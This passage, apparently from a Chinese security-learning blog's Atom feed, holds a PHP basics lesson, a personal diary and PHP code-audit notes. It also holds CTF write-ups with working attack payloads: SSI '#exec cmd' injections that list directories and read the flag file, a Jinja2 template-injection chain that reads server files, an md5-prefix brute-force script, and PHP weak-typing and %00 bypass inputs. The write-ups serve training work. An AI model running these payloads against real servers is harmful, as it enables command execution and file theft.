alt="image-20210903150404934"></p><p>请注意</p><p>我们所编写的PHP代码是如何嵌入到一个常见的HTML文件中的</p><p>通过浏览器，我们查看该HTML的源代码</p><p><img src="/2021/09/03/php/1/image-20210903150637332.png" alt="image-20210903150637332"></p><p>以上代码并没有显示原始的PHP语句</p><p>这是因为PHP解释器已经运行了该脚本，并且用该脚本的输出代替了脚本的本身。</p><p>也就是说，通过PHP，我们可以生成能在任何浏览器中查看的纯HTML，换一个意思理解，用户的浏览并不需要理解PHP。</p><p>此文件组成：</p><p>1.HTML 2.PHP标记 3.PHP语句 4.空格</p><p>1.3.1</p><p>PHP标记</p><?php    为开始，?><p>为结束</p><p>​        这样的标记称作PHP标记，可以告诉服务器PHP代码的开始和结束。</p><p>XML风格(建议使用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>简短风格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;; ?&gt;</span><br></pre></td></tr></table></figure><p>1.3.2</p><p>PHP语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;&lt;p&gt;Order processed.&lt;&#x2F;p&gt;&#39;;</span><br></pre></td></tr></table></figure><p>echo语句：将传递给其自身的字符串打印或者回显到浏览器</p><p>1.7.1</p><p>PHP的数据类型</p><p>1.整数    Integer</p><p>2.浮点数    Float</p><p>3.字符串    String</p><p>4.布尔    Boolean</p><p>5.数组    Array</p><p>6.对象    Object</p><p>附：三个特殊类型 NULL（空）、resource（资源）、</p><p>callable 。</p><p>1.7.2</p><p>类型强度</p><p>PHP是一种弱类型，或者动态型语言</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$total1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">$total2 &#x3D; 0.00;</span><br></pre></td></tr></table></figure><p>此时，$total1是一个整数类型的变量</p><p>而$total2是一个浮点类型的变量。</p><p>若添加以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$total2 &#x3D; &#39;Hello&#39;;</span><br></pre></td></tr></table></figure><p>则$total2是字符串类型的变量。</p><p>1.7.3</p><p>类型转换</p><p>1.7.4</p><p>可变变量</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 从创建示例Web应用开始：Bob的汽车零部件商店&lt;/p&gt;
&lt;p&gt;创建订单表单：&lt;/p&gt;
&lt;p&gt;任何服务器端脚本语言最常见的应用场景是之一&lt;/p&gt;
&lt;p&gt;1.1&lt;/p&gt;
&lt;p&gt;就是处理HTML表单。&lt;/p&gt;
&lt;p&gt;接下来程序清单1-1：order.html，商店基础HTML</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <link href="http://daweitech.github.io/2021/09/02/buu/18/"/>
    <id>http://daweitech.github.io/2021/09/02/buu/18/</id>
    <published>2021-09-02T11:56:57.000Z</published>
    <updated>2021-09-02T12:57:15.636Z</updated>
    
    <content type="html"><![CDATA[<p> 参考博客：</p><p><a href="https://blog.csdn.net/devilare/article/details/119351945">https://blog.csdn.net/devilare/article/details/119351945</a>    </p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)">https://www.cnblogs.com/wangtanzhi/p/12354394.html![image-20210902195758511](18/image-20210902195758511.png)</a></p><p>打开后只有一个输入框</p><p>尝试了一下sql注入</p><p>只会出现一样的弹框</p><p><img src="/2021/09/02/buu/18/image-20210902195901927.png" alt="image-20210902195901927"></p><p>扫描目录后发现还有swp文件</p><p>访问得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">$content &#x3D; uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>映入眼帘的就是hash函数</p><p>注意到登陆代码</p><p><img src="/2021/09/02/buu/18/image-20210902200408592.png" alt="image-20210902200408592"></p><p>​        解释起来，就是password必须hash加密后要等于6d0bc1，满足后就会输出script弹窗 </p><p>‘Welcome to manage system’</p><p><img src="/2021/09/02/buu/18/image-20210902200802654.png" alt="image-20210902200802654"></p><p>登录成功后会生成相应的shtml文件</p><p>开始解题</p><p>先得到脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">import threading</span><br><span class="line">string &#x3D; &#39;0123456789&#39;</span><br><span class="line">class BF(threading.Thread):</span><br><span class="line">    def __init__(self,left,right):</span><br><span class="line">        threading.Thread.__init__(self) #父类的构造方法</span><br><span class="line">        self.left &#x3D; left</span><br><span class="line">        self.right &#x3D; right</span><br><span class="line">    def run(self):</span><br><span class="line">        admin &#x3D; &#39;6d0bc1&#39;</span><br><span class="line">        for i in range(self.left,self.right):</span><br><span class="line">            s &#x3D; hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">            if s[:6] &#x3D;&#x3D; admin:</span><br><span class="line">                print i</span><br><span class="line">threads &#x3D; []</span><br><span class="line">thread_count &#x3D; 5</span><br><span class="line">for i in range(thread_count):</span><br><span class="line">    threads.append(BF(i*2000000, (i+1)*2000000))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑完后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\#2020666</span><br><span class="line">\#2305004</span><br><span class="line">\#9162671</span><br></pre></td></tr></table></figure><p>选择其中一个密码登录</p><p>然后查看网络状态</p><p><img src="/2021/09/02/buu/18/image-20210902201334561.png" alt="image-20210902201334561"></p><p>用这里的路径访问下</p><p><img src="/2021/09/02/buu/18/image-20210902201420408.png" alt="image-20210902201420408"></p><p>看wp知道了后面用ssti模板注入</p><p>这里有一个知识点</p><p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p><p>username成为注入点</p><!--#exec cmd="whoami"--><p><img src="/2021/09/02/buu/18/image-20210902201644511.png" alt="image-20210902201644511"></p><!--#exec cmd="ls"--><p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201754915.png" alt="image-20210902201754915"></p><!--#exec cmd="ls ../"-->  #看一下上层目录<p><img src="/2021/09/02/buu/18/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210902201952167.png" alt="image-20210902201952167"></p><p>找到了</p><!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><p><img src="/2021/09/02/buu/18/image-20210902202133502.png" alt="image-20210902202133502"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 参考博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/devilare/article/details/119351945&quot;&gt;https://blog.csdn.net/devilare/article/details/119351945</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(二)</title>
    <link href="http://daweitech.github.io/2021/09/02/php/0/"/>
    <id>http://daweitech.github.io/2021/09/02/php/0/</id>
    <published>2021-09-02T09:57:07.000Z</published>
    <updated>2021-09-02T12:56:37.441Z</updated>
    
    <content type="html"><![CDATA[<h4 id="文件上传漏洞挖掘与利用"><a href="#文件上传漏洞挖掘与利用" class="headerlink" title="文件上传漏洞挖掘与利用"></a>文件上传漏洞挖掘与利用</h4><p>1.搜索 move_uploaded_file()函数, 在PHP中上传函数只有这一个</p><p>2.查看上传文件的代码是否存在限制或可以绕过</p><p>3.搜索include、require、include_once、require_once函数，</p><p>是否存在可控变量。</p><p>4.追踪程序运行流程，查看模块加载时包含的文件是否可控。</p><p><img src="/2021/09/02/php/0/capture_20210902180930752.bmp" alt="capture_20210902180930752"></p><p>任意文件读取、下载、写入、删除、漏洞挖掘与利用</p><p>黑盒看功能点对应的文件， 再去读文件</p><p>搜索文件读取的函数， 查看是否存在直接或者直接控制的变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents、highlight_file、fopen、readfile、fread、</span><br><span class="line"></span><br><span class="line">fgetss、fgets、parse_ini_file、show_source、file、fwrite、</span><br><span class="line"></span><br><span class="line">file_put_contents、unlink</span><br></pre></td></tr></table></figure><p><img src="/2021/09/02/php/0/image-20210902181425601.png" alt="image-20210902181425601"></p><h4 id="SSRF漏洞挖掘与利用"><a href="#SSRF漏洞挖掘与利用" class="headerlink" title="SSRF漏洞挖掘与利用"></a>SSRF漏洞挖掘与利用</h4><p>1.找对应功能点，直接黑盒测试查看是否能简单利用，不能再去追踪流程分析传递过程。</p><p>2.白盒挖掘则需要搜索带有变量参数的相关函数</p><p>3.file_get_contents()</p><p>4.fsockopen()</p><p>5.curl_exec()</p><p>6.fopen()</p><p><img src="/2021/09/02/php/0/image-20210902203610020.png" alt="image-20210902203610020"></p><h4 id="代码执行漏洞挖掘与利用"><a href="#代码执行漏洞挖掘与利用" class="headerlink" title="代码执行漏洞挖掘与利用"></a>代码执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数， 回溯跟踪</p><p>2.eval、assert、preg_repleace、$_ GET($_POST[]);</p><p>call_user_func、call_user_func_array、array_map等函数。</p><p><img src="/2021/09/02/php/0/image-20210902204019087.png" alt="image-20210902204019087"></p><h4 id="命令执行漏洞挖掘与利用"><a href="#命令执行漏洞挖掘与利用" class="headerlink" title="命令执行漏洞挖掘与利用"></a>命令执行漏洞挖掘与利用</h4><p>1.寻找相关代码的敏感函数，回溯跟踪</p><p>2.system、exec、shell_exec、passthru</p><p>反引号``、popen、ob_start、pcntl_exec</p><p>proc_open</p><p><img src="/2021/09/02/php/0/image-20210902204301956.png" alt="image-20210902204301956"></p><h4 id="SQL注入漏洞挖掘与利用"><a href="#SQL注入漏洞挖掘与利用" class="headerlink" title="SQL注入漏洞挖掘与利用"></a>SQL注入漏洞挖掘与利用</h4><p>1.跟踪参数传递是否存在过滤，数据库查询是否使用预编译</p><p>2.一般数据库查询会被封装在几个核心文件中，反复调用。当然在某些复杂的功能中，</p><p>可能也会存在不使用封装的函数，所以需要全面排查。</p><p>3.在挖掘的过程中，也要注意宽字节注入、二次注入等方法的可能性。</p><p><img src="/2021/09/02/php/0/image-20210902204505442.png" alt="image-20210902204505442"></p><h4 id="XSS漏洞挖掘与利用"><a href="#XSS漏洞挖掘与利用" class="headerlink" title="XSS漏洞挖掘与利用"></a>XSS漏洞挖掘与利用</h4><p>1.查看参数传递进入到输出是否存在过滤函数</p><p>2.常见的输出函数，print、print_r、echo、printf、sprint、die</p><p>var_dump、var_export等</p><p><img src="/2021/09/02/php/0/image-20210902204739145.png" alt="image-20210902204739145"></p><h4 id="CSRF漏洞挖掘与利用"><a href="#CSRF漏洞挖掘与利用" class="headerlink" title="CSRF漏洞挖掘与利用"></a>CSRF漏洞挖掘与利用</h4><p>1.查看提交数据功能点，抓包查看是否token，查看核心代码中是否存在token或者referer校验</p><p>2.可以直接搜索token、referer关键字</p><p>反序列化漏洞挖掘与利用</p><p>搜索带有变量参数的反序列化函数unserliaze()，查看是否存在利用点</p><p>反序列化中需关注的函数</p><p><img src="/2021/09/02/php/0/image-20210902205114294.png" alt="image-20210902205114294"></p><h4 id="install系统重装漏洞"><a href="#install系统重装漏洞" class="headerlink" title="install系统重装漏洞"></a>install系统重装漏洞</h4><p>在安装过程中，</p><p>需要填写Web应用的数据库配置，一般会将配置直接写入到配置文件中，</p><p>在写入的过程中往往没有校验</p><p>(有可能其他安装后修改的功能会做校验)，导致</p><p>直接写入php代码到配置文件中，</p><p>从而达到任意代码执行的目的</p><p>install系统重装验证绕过漏洞</p><p>某些CMS的install的验证不严谨，导致直接绕过重装，例如</p><p>1.</p><p>使用JavaScript跳转，但是后面的代码仍然会被执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this\-&gt;myclass-\&gt;notice(&#39;alert(&quot;系统已安装过&quot;);window.location.href&#x3D;&quot;&#39;.site_url().&#39;&quot;;&#39;);</span><br></pre></td></tr></table></figure><p>2.</p><p>使用header()</p><p>函数进行跳转，没有使用die()</p><p>或者exit()结束，那么后面部分的代码仍然会</p><p>被执行</p><p>//header 头并不会结束之后的代码，漏洞出在这里</p><p>header( ‘location: ../index.php’);</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;文件上传漏洞挖掘与利用&quot;&gt;&lt;a href=&quot;#文件上传漏洞挖掘与利用&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞挖掘与利用&quot;&gt;&lt;/a&gt;文件上传漏洞挖掘与利用&lt;/h4&gt;&lt;p&gt;1.搜索 move_uploaded_file()函数, 在PHP中</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <link href="http://daweitech.github.io/2021/09/01/buu/17/"/>
    <id>http://daweitech.github.io/2021/09/01/buu/17/</id>
    <published>2021-09-01T07:29:25.000Z</published>
    <updated>2021-09-07T12:35:48.087Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)</a></p><p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeo的博客-CSDN博客</a></p><p>最近刚学了模板注入，这题就直接顺着flask的payload去</p><p><img src="/2021/09/01/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p><p>试着用简单的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure><p>经过加密解密提交后</p><p><img src="/2021/09/01/buu/17/image-20210901160005521.png" alt="image-20210901160005521"></p><p>再尝试用system函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;ls&#39;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/buu/17/image-20210901160203877.png" alt="image-20210901160203877"></p><p>好家伙，果然被过滤了</p><p>试了几个关键字都不行后，查看提示，在源码处看到</p><p><img src="/2021/09/01/buu/17/image-20210901160310325.png" alt="image-20210901160310325"></p><p>看到PIN</p><p>果断上网查了文章，发现PIN还挺难得到的</p><p>主要是python脚本不会写。。。</p><p>接下来按照正常解题流程：</p><p>payload1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>得到</p><p><img src="/2021/09/01/buu/17/image-20210901160640173.png" alt="image-20210901160640173"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/cbca419ba075&quot;&gt;flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[&lt;a href=&quot;https://blog.csdn.net/Sop</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>Daily</title>
    <link href="http://daweitech.github.io/2021/09/01/x/q/"/>
    <id>http://daweitech.github.io/2021/09/01/x/q/</id>
    <published>2021-09-01T06:37:51.000Z</published>
    <updated>2021-09-05T02:34:36.793Z</updated>
    
    <content type="html"><![CDATA[<p>​    之后这篇文章就来记录一些日常了</p><p>9.1</p><p>很开心啊，昨天发布的文章到今天就有90多个访问量</p><p>而且登上了csdn的php榜第25名！再接再厉！</p><p><img src="/2021/09/01/x/q/image-20210901144059817.png" alt="image-20210901144059817"></p><p>9.2</p><p>没想到代码审计的文章能到第五名</p><p>真是意外</p><p>虽然浏览量不太高(emm,再接再励吧)</p><p><img src="/2021/09/01/x/q/image-20210902180307061.png" alt="image-20210902180307061"></p><p>9.5</p><p>果然会忘记记录哈哈</p><p>最近发现题目都不太好理解</p><p>代码审计还是比较难啊，真的很想把强网杯那题看懂啊啊啊</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    之后这篇文章就来记录一些日常了&lt;/p&gt;
&lt;p&gt;9.1&lt;/p&gt;
&lt;p&gt;很开心啊，昨天发布的文章到今天就有90多个访问量&lt;/p&gt;
&lt;p&gt;而且登上了csdn的php榜第25名！再接再厉！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/01/x/q/image-20</summary>
      
    
    
    
    
    <category term="分享" scheme="http://daweitech.github.io/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(一)</title>
    <link href="http://daweitech.github.io/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    <id>http://daweitech.github.io/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</id>
    <published>2021-08-31T06:33:44.000Z</published>
    <updated>2021-09-02T09:59:22.901Z</updated>
    
    <content type="html"><![CDATA[<p> <strong>文章内容来自于：安恒信息</strong></p><h3 id="通用代码审计思路："><a href="#通用代码审计思路：" class="headerlink" title="通用代码审计思路："></a>通用代码审计思路：</h3><h4 id="1-根据敏感关键字回溯参数传递过程-逆向追踪"><a href="#1-根据敏感关键字回溯参数传递过程-逆向追踪" class="headerlink" title="1.根据敏感关键字回溯参数传递过程(逆向追踪)"></a>1.根据敏感关键字回溯参数传递过程(逆向追踪)</h4><p>​            检查敏感函数的参数，进行回溯变量，判断变量是否可控并且没有经过严格的过滤，这是一个逆向追踪的过程。</p><h4 id="2-寻找可控参数，正向追踪变量传递过程-正向追踪"><a href="#2-寻找可控参数，正向追踪变量传递过程-正向追踪" class="headerlink" title="2.寻找可控参数，正向追踪变量传递过程(正向追踪)"></a>2.寻找可控参数，正向追踪变量传递过程(正向追踪)</h4><p>​            跟踪传递的参数，判断是否存入到敏感函数内或者传递的过程中具有代码逻辑漏洞。</p><h4 id="3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞"><a href="#3-寻找敏感功能点，通读功能点代码-直接挖掘功能点漏洞" class="headerlink" title="3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)"></a>3.寻找敏感功能点，通读功能点代码(直接挖掘功能点漏洞)</h4><p>​            根据自身经验判断在该应用中的哪些功能可能出现漏洞。</p><h4 id="4-直接通读全文代码"><a href="#4-直接通读全文代码" class="headerlink" title="4.直接通读全文代码"></a>4.直接通读全文代码</h4><h3 id="敏感函数回溯审计："><a href="#敏感函数回溯审计：" class="headerlink" title="敏感函数回溯审计："></a>敏感函数回溯审计：</h3><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103125151.png" alt="image-20210901103125151"></p><h4 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103255032.png" alt="image-20210901103255032"></p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901103436076.png" alt="image-20210901103436076"></p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><p>php弱类型</p><h4 id="1-比较符号"><a href="#1-比较符号" class="headerlink" title="1.比较符号"></a>1.比较符号</h4><p>==            先进行类型转化，再进行比较（弱比较）</p><p>===          先比较类型，若类型不同直接返回不等（强比较）</p><p>Tips</p><p>Bool类型的true和任意字符串的弱类型相等</p><p>数字与字符串相比较，会将字符串转化为数字</p><p>若字符串以数字开头，则取开头数字作为转化结果，</p><p>若无则转化为0，若符合科学记数法的形式，则按照科学记数法来取</p><h4 id="2-hash比较缺陷"><a href="#2-hash比较缺陷" class="headerlink" title="2.hash比较缺陷"></a>2.hash比较缺陷</h4><p>如果采用</p><p>== 运算符比较哈希值，会面临上面讲的弱类型比较的问题，</p><p>即任何以’0e’ 开头的字符串都相等！</p><p>常见的md5</p><p>运算后以’0e’开头的字符串有：</p><p>QNKCDZO</p><p>s878926199a</p><p>s155964671a</p><p>s1885207154a</p><p>s1836677006a</p><p>s1184209335a</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104340610.png" alt="image-20210901104340610"></p><h4 id="3-md5-sha1函数缺陷"><a href="#3-md5-sha1函数缺陷" class="headerlink" title="3.md5 sha1函数缺陷"></a>3.md5 sha1函数缺陷</h4><p>当md5()函数与sha1()函数对参数进行加密处理时，</p><p>如果碰到一个数组，md5()函数会返回null</p><p>sha1()函数也是一样。</p><p>利用这个特性构造两个数组即可。</p><p>a[]=1即表示传入了一个数组</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104608235.png" alt="image-20210901104608235"></p><p>变量覆盖</p><h4 id="1-parse-str导致的变量覆盖"><a href="#1-parse-str导致的变量覆盖" class="headerlink" title="1.parse_str导致的变量覆盖"></a>1.parse_str导致的变量覆盖</h4><p>parse_str( string $encoded_string[.array &amp;$result] )</p><p>parse_str() 函数用于把查询字符串解析到变量中，</p><p>如果没有result参数，则由该函数设置的变量将覆盖已存在的同名变量，</p><p>如果设置了第二个变量result</p><p>变量将会以数组元素的形式存入到这个数组，作为替代。</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901145407518.png" alt="image-20210901145407518"></p><h4 id="2-X-Forwarded-For绕过指定地址"><a href="#2-X-Forwarded-For绕过指定地址" class="headerlink" title="2.X-Forwarded-For绕过指定地址"></a>2.X-Forwarded-For绕过指定地址</h4><p>HTTP头添加X-Forwarded-For：</p><h4 id="3-strops数组绕过NULL与ereg正则-00截断"><a href="#3-strops数组绕过NULL与ereg正则-00截断" class="headerlink" title="3.strops数组绕过NULL与ereg正则%00截断"></a>3.strops数组绕过NULL与ereg正则%00截断</h4><p>知识点补充：</p><p>PHP strops()函数</p><p>定义和用法：</p><p>strops()函数查找字符串在另一字符串第一次出现的位置</p><p>注释：strops()函数对大小写敏感</p><p>​            该函数是二进制安全的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="keyword">string</span>,find,start)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定在何处开始搜索。</td></tr></tbody></table><table><thead><tr><th>返回值：</th><th>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</th></tr></thead><tbody><tr><td>PHP 版本：</td><td>4+</td></tr></tbody></table><p>ereg正则函数</p><p>字符串比对解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ereg(<span class="keyword">string</span> pattern, <span class="keyword">string</span> <span class="keyword">string</span>, <span class="keyword">array</span> [regs]);</span><br></pre></td></tr></table></figure><p>本函数以 pattern 的规则来解析比对字符串 string。</p><p>比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901150729125.png" alt="image-20210901150729125"></p><p>方法一：</p><p>既要是纯数字</p><p>又要有’ #biubiubiu’</p><p>strpos()找的是字符串，那么传一个数组给它</p><p>strpos()出错返回null,null!==false,</p><p>所以符合要求</p><p>所以输入nctf[]= </p><p>那为什么ereg()也能符合呢?</p><p>因为ereg()</p><p>在出错时返回的也是null,null!==false,</p><p>所以符合要求</p><p>方法二：</p><p>字符串截断</p><p>利用ereg()的NULL截断漏洞，绕过正则过滤</p><p>?nctf=1%00%23biubiubiu </p><h3 id="模拟演练："><a href="#模拟演练：" class="headerlink" title="模拟演练："></a>模拟演练：</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831213941122.bmp" alt="capture_20210831213941122"></p><p>?password=1337a</p><h4 id="2"><a href="#2" class="headerlink" 